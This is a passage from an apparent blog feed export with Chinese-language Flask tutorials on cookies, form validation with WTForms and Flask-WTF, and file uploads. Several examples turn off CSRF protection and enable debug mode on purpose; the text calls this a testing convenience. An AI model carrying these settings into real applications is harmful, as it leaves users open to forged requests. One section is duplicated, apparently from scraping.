string">'blog'</span><span class="token punctuation">,</span> __name__<span class="token punctuation">,</span>subdomain<span class="token operator">=</span><span class="token string">'blog'</span><span class="token punctuation">)</span>@bp<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'123'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> blueprint_model <span class="token keyword">import</span> blog<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token keyword">from</span> uuid <span class="token keyword">import</span> uuid4app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'TEMPLATES_AUTO_RELOAD'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">"SERVER_NAME"</span><span class="token punctuation">:</span> <span class="token string">"kningyuan.club:5000"</span>  <span class="token comment" spellcheck="true"># 设置网站主域名</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'Hello World!'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># cookie是设置在 Response 响应对象上的,普通的字符串也是通过 response()方法返回的</span><span class="token comment" spellcheck="true"># 如果要显式的返回,可以使用 make_response函数</span><span class="token comment" spellcheck="true"># 假设用户为 ning,返回的应该是个性化窗口 ning.html</span>id <span class="token operator">=</span> str<span class="token punctuation">(</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'user.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 只设置 key,value 键值对</span><span class="token comment" spellcheck="true"># 域名记得加端口号,除非你是80端口</span>resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span>name<span class="token punctuation">,</span>id<span class="token punctuation">,</span>domain<span class="token operator">=</span><span class="token string">'.kningyuan.club:5000'</span><span class="token punctuation">,</span>max_age<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">return</span> resp<span class="token comment" spellcheck="true"># 注册蓝图</span>app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>blog<span class="token punctuation">.</span>bp<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.110'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过期时间除了设置<code>max-age</code> 外,也可以设置<code>expires</code> ,它指定的是<code>datetime</code> 数据类型.需要注意的是,它是格林威治标准时间,如果是在中国,需要换算时区,也就是和你真正设定的时间少8小时.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 想要指定的时间</span>expires <span class="token operator">=</span> datetime<span class="token punctuation">(</span>year<span class="token operator">=</span><span class="token number">2018</span><span class="token punctuation">,</span>month<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>day<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">,</span>hour<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span>minute<span class="token operator">=</span><span class="token number">29</span><span class="token punctuation">,</span>second<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 真正设置的时间.</span>expires <span class="token operator">=</span> datetime<span class="token punctuation">(</span>year<span class="token operator">=</span><span class="token number">2018</span><span class="token punctuation">,</span> month<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span> day<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">,</span> hour<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span> minute<span class="token operator">=</span><span class="token number">29</span><span class="token punctuation">,</span> second<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>验证:</p><ul><li>首先使用浏览器访问<code>kningyuan.club:5000/login/</code>,登录网站,成功获取到<code>cookie</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600957711743-10046.png" alt="11045"></p><ul><li>在打开新标签页访问<code>blog.kningyuan.club:5000</code>,查看是否有<code>cookie</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-24/1600957711747-10045.png" alt="11046"></p></blockquote><h4 id="4-删除cookie"><a href="#4-删除cookie" class="headerlink" title="4.删除cookie"></a>4.删除<code>cookie</code></h4><blockquote><p>如果要删除<code>cookie</code> ,可以设置超时时间使浏览器删除<code>cookie</code> .还有一种方法是服务器删除<code>cookie</code>.</p><pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/del_cookie'</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">del_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          response<span class="token operator">=</span>make_response<span class="token punctuation">(</span><span class="token string">'delete cookie2'</span><span class="token punctuation">)</span>          response<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>          <span class="token keyword">return</span> response  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask cookie </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask表单验证</title>
      <link href="/posts/61110.html"/>
      <url>/posts/61110.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-23/1600871187232-10297.png" alt="10297"><br>[TOC]</p><h2 id="Flask-WTF"><a href="#Flask-WTF" class="headerlink" title="Flask-WTF"></a><code>Flask-WTF</code></h2><blockquote><p><code>Flask-WTF</code> 提供了<code>Flask</code>中<code>WTForms</code> 的简单集成.在一定程度上简化了<code>WTForms</code> 更适用于<code>FLask</code> .</p><p>它提供了<code>CSRF,File_upload,reCAPTCHA</code> 等.</p><p>特性:</p><ul><li>Integration with <code>WTForms</code>.</li><li>Secure Form with <code>CSRF token</code>.</li><li>Global <code>CSRF</code> protection.</li><li><code>reCAPTCHA</code> support.</li><li>File upload that works with Flask-Uploads.</li><li>Internationalization using Flask-Babel</li></ul><p>安装:</p><pre class="line-numbers language-bash">$ pip install flask-wtf</code></pre></blockquote><h3 id="1-创建表单"><a href="#1-创建表单" class="headerlink" title="1.创建表单"></a>1.创建表单</h3><blockquote><p>代码参考:<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T15</code></p><p><code>WTForms</code> 和<code>Flask-WTF</code> 对比</p><ol><li>首先 创建<code>html</code>模板文件,因为两者的模板是相同的(<code>register.html</code>).</li></ol><pre><code class="html"><code class="language-bash">$ pip install flask-wtf</code></pre></blockquote><h3 id="1-创建表单"><a href="#1-创建表单" class="headerlink" title="1.创建表单"></a>1.创建表单</h3><blockquote><p>代码参考:<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T15</code></p><p><code>WTForms</code> 和<code>Flask-WTF</code> 对比</p><ol><li>首先 创建<code>html</code>模板文件,因为两者的模板是相同的(<code>register.html</code>).</li></ol><pre><code class="html"><div id="box"><form action="" method="POST"><table><tr>    <td><input type="text" placeholder="你的昵称" name="username"></td></tr><tr>    <td><input type="password" placeholder="设置密码" name="password"></td></tr><tr>    <td><input type="password" placeholder="确认密码" name="repeat_password"></td></tr><tr>    <td><input type="text" placeholder="手机号" name="phone"></td></tr><tr>    <td><input type="text" placeholder="邮箱" name="email"></td></tr><tr>    <td><input type="text" placeholder="年龄" name="age"></td></tr><tr>    <td><input type="submit" value="注册"></td></tr></table></form><p>{% if info %} {{ info }} {% endif %} </p></div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>利用<code>WTForms</code>创建后台表单并验证<code>app.py</code></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>request<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> Form<span class="token comment" spellcheck="true"># 导入约束域</span><span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span>PasswordField<span class="token punctuation">,</span>IntegerField<span class="token comment" spellcheck="true"># 导入验证器</span><span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span>Email<span class="token punctuation">,</span>EqualTo<span class="token punctuation">,</span>NumberRange<span class="token punctuation">,</span>Regexpapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token comment" spellcheck="true"># 1.创建模板文件 register.html</span><span class="token comment" spellcheck="true"># 2.创建后台表单文件</span><span class="token keyword">class</span> <span class="token class-name">RegistForm</span><span class="token punctuation">(</span>Form<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">"""处理表单内容"""</span>username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'用户名不正确'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>password<span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'密码长度不够'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>repeat_password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>EqualTo<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'密码不匹配'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>phone <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Regexp<span class="token punctuation">(</span>r<span class="token string">'1[3578]\d{9}'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'输入正确的手机号'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>email<span class="token operator">=</span>StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Email<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">'输入正确的邮箱地址'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>age <span class="token operator">=</span> IntegerField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>NumberRange<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'不接受未成年人'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建路由</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">regist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span><span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true"># 手动导入 request.form 表单对象去验证</span>form <span class="token operator">=</span> RegistForm<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span><span class="token keyword">if</span> form<span class="token punctuation">.</span>validate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 返回布尔值,验证正确返回True</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># 接受错误信息</span>   message <span class="token operator">=</span> <span class="token string">''</span>   <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> form<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">for</span> i <span class="token keyword">in</span> v<span class="token punctuation">:</span>           message <span class="token operator">=</span> message <span class="token operator">+</span> <span class="token string">'\r{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span>message<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>使用<code>flask-wtf</code> 创建表单并验证<code>app_flaskwtf.py</code></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>request<span class="token comment" spellcheck="true"># from wtforms import Form</span><span class="token comment" spellcheck="true"># 从flask_wtf 中导入表单对象 FlaskForm</span><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token comment" spellcheck="true"># 导入约束域</span><span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span>PasswordField<span class="token punctuation">,</span>IntegerField<span class="token comment" spellcheck="true"># 导入验证器</span><span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span>Email<span class="token punctuation">,</span>EqualTo<span class="token punctuation">,</span>NumberRange<span class="token punctuation">,</span>Regexpapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 在这里先显式的关闭CSRF保护</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'WTF_CSRF_ENABLED'</span> <span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello World"</span><span class="token comment" spellcheck="true"># 创建后台表单文件</span><span class="token keyword">class</span> <span class="token class-name">Flaskwtf_RegisterForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""处理表单内容"""</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'用户名不正确'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password<span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'密码长度不够'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    repeat_password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>EqualTo<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'密码不匹配'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    phone <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Regexp<span class="token punctuation">(</span>r<span class="token string">'1[3578]\d{9}'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'输入正确的手机号'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    email<span class="token operator">=</span>StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Email<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">'输入正确的邮箱地址'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    age <span class="token operator">=</span> IntegerField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>NumberRange<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'不接受未成年人'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建路由,验证表单</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">regist</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> Flaskwtf_RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># validate_to_submit 会自动检查POST方法,只有是POST并且验证正确,返回True</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span><span class="token string">'success'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> form<span class="token punctuation">.</span>errors<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> v<span class="token punctuation">:</span>                message <span class="token operator">=</span> message <span class="token operator">+</span> <span class="token string">'\r{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span>info<span class="token operator">=</span>message<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 用于返回 GET方法的模板</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>可以看到<code>flask-wtf</code> 和<code>WTForms</code> 的使用基本相同.只有导入的<code>FlaskForm</code> 不一样,而<code>FlaskForm</code> 默认是开启<code>CSRF</code>保护的,这里先全局禁用了<code>CSRF</code>.</p><p>除了这些,它还用于扩展文件上传.</p></blockquote><h3 id="2-CSRF安全"><a href="#2-CSRF安全" class="headerlink" title="2.CSRF安全"></a>2.<code>CSRF</code>安全</h3><blockquote><p>默认情况下,<code>FlaskForm</code> 是开启<code>CSRF</code> 保护的.官网也是支持开启<code>CSRF</code> 保护的,这里为了测试,暂时先关闭保护.</p><p>禁用保护可以分为两种:全局禁用,对某一个<code>form</code>表单禁用</p><ul><li>全局禁用:需要在<code>config.py</code>中配置<code>WTF_CSRF_ENABLED = False</code></li><li>对单个<code>Form</code> 禁用:设置单个<code>form=FlaskForm(csrf_enable=False)</code></li></ul><p>如果开启<code>CSRF</code> 保护,就必须设置一个秘钥,在<code>config.py</code> 中设置<code>SECRET_KEY=&#39;a random string&#39;</code></p></blockquote><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h3><blockquote><p>注意:这里为了测试关闭了<code>CSRF</code> 保护,否则会报错<code>{&#39;csrf_token&#39;: [&#39;The CSRF token is missing.&#39;]}</code></p><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>send_from_directory<span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token punctuation">,</span>redirect<span class="token keyword">from</span> flask_wtf<span class="token punctuation">.</span>file <span class="token keyword">import</span> FileField<span class="token punctuation">,</span>FileAllowed<span class="token punctuation">,</span>FileRequired<span class="token keyword">import</span> os<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>datastructures <span class="token keyword">import</span> CombinedMultiDictapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 指定文件的上传路径</span>Dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/uploads/'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'TEMPLATES_AUTO_RELOAD'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'UPLOAD_FOLDER'</span> <span class="token punctuation">:</span> Dir <span class="token punctuation">,</span>               <span class="token comment" spellcheck="true"># 指定要上传的文件夹</span> <span class="token string">'MAX_CONTENT_LENGTH'</span> <span class="token punctuation">:</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 指定上传的文件的最大大小</span> <span class="token comment" spellcheck="true">#'SECRET_KEY':'a random string'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#CsrfProtect(app)</span><span class="token comment" spellcheck="true"># 1.创建上传表单</span><span class="token comment" spellcheck="true"># upload.html</span><span class="token comment" spellcheck="true"># 2.定义后台表单</span><span class="token keyword">class</span> <span class="token class-name">PhotoForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""约束表单中的元素"""</span> photo <span class="token operator">=</span> FileField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>FileAllowed<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'image only'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                               FileRequired<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.定义路由,表单验证</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/uploads/'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 不用显式的传递 request.form</span> form <span class="token operator">=</span> PhotoForm<span class="token punctuation">(</span>csrf_enabled<span 